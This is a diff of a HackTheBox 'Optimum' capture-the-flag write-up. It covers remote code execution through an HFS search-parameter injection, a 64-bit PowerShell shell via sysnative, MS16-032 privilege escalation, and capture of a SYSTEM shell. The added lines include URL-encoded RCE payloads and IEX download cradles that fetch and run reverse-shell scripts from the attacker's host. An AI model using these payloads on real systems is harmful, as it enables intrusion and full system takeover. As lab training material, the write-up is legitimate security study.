@@ -111,15 +111,13 @@ except Exception as ex:
 In Python, `{}` in a `f-string (notice the url is wrapped in f' ')` represent variables, so the `{{` and `}}` are how you escape to write actual curly brackets. So this is just a single HTTP request to `/?search={.+exec|[url-encoded command].}` to get `RCE`.
 
 I started `Burp`, intercepted thre request, sent it to the `Repeater` and edited the URL to the following, to check it was actually exploitable.
-```
-http://10.10.10.8/?search=%00{.+exec|C%3A%5Cwindows%5Csystem32%5Ccmd.exe%20/c%20ping%2010.10.16.2.}
-```
+
 As a proof of concept, I crafted this URL to try to ping myself:
 ```
 http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.16.2.}
 ```
 
-f it works, I should see a single ICMP packet at my host. I started `tcpdump` and submitted, and nothing.
+If it works, I should see a single ICMP packet at my host. I started `tcpdump` and submitted, and nothing.
 
 Often, this can be an issue with the system not finding the path to ping in this current environment. So I tried adding cmd `/c` before the command:
 ```
@@ -176,7 +174,7 @@ IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.2/winPEAS.exe')
 
 Scanning through the output, there were a few interesting things.
 
-The box is `Windows Server 2012 R2`, and `64-bit:
+The box is `Windows Server 2012 R2`, and `64-bit`:
 ```
     Hostname: optimum                               
     ProductName: Windows Server 2012 R2 Standard
@@ -251,6 +249,21 @@ Since, when I ran `systeminfo` command on the device before, I knew it was a 64-
 
 ```
 PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
+False
+```
+The shell we got was running on 32-bit process, this is because the `HFS` process is likely running as a `32-bit` process. So, my first task was to run `powershell` on 64-bit process.
+
+So from within a 32-bit session, calling PowerShell from the `C:\windows\system32` path will give the 32-bit version. To get a `64-bit` shell, I’ll use the full path to PowerShell in the `sysNative` directory:
+
+SO, I hoped backed to `BurpSuite`, and edited the request I had in the repeater with the following, exited out of the shell, started another listerner on the same port.
+```
+/?search=%00{.exec|C%3a\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.2/rev.ps1').}
+```
+
+Once, it was done, I, again, received a user shell, which is similar to the one I got previously but now it was running a `64-bit` shell
+
+```
+PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
 True
 ```
 
@@ -277,17 +290,35 @@ PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http:/
 There’s a request right away for `Invoke-MS16032.ps1`. Once that last message pops, there’s another request for `rev.ps1`, and then a shell at `nc`:
 
 ```
-┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Optimum]
-└─$ sudo nc -lnvp 443
+┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/Optimum/Another-try]
+└─$ sudo nc -lnvp 443            
 listening on [any] 443 ...
-connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49244
-whoami
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.8] 49246
+Windows PowerShell running as user OPTIMUM$ on OPTIMUM
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\kostas\Desktop>whoami
 nt authority\system
-PS C:\Users\kostas\Desktop>
 ```
 
 And I can grab `root.txt`:
 ```
+PS C:\Users\kostas\Desktop> cd C:\users\administrator\desktop
+PS C:\users\administrator\desktop> dir
+
+
+    Directory: C:\users\administrator\desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-ar--          6/2/2023   3:21 ??         34 root.txt                          
+
+
 PS C:\users\administrator\desktop> type root.txt
 [REDACTED]
+```
+
+```
+NOTE: While solving the box, the most important thing to remember is to be in a 64-bit process while running the Privilege Escalation exploit, otherwise, if you're unknowingly running it while being in a 32-bit process, you'll never get back a root shell. I did the same and was not able to figure out the figure for couple of days and then I realised the silly mistake I made and never focused on it.
 ```
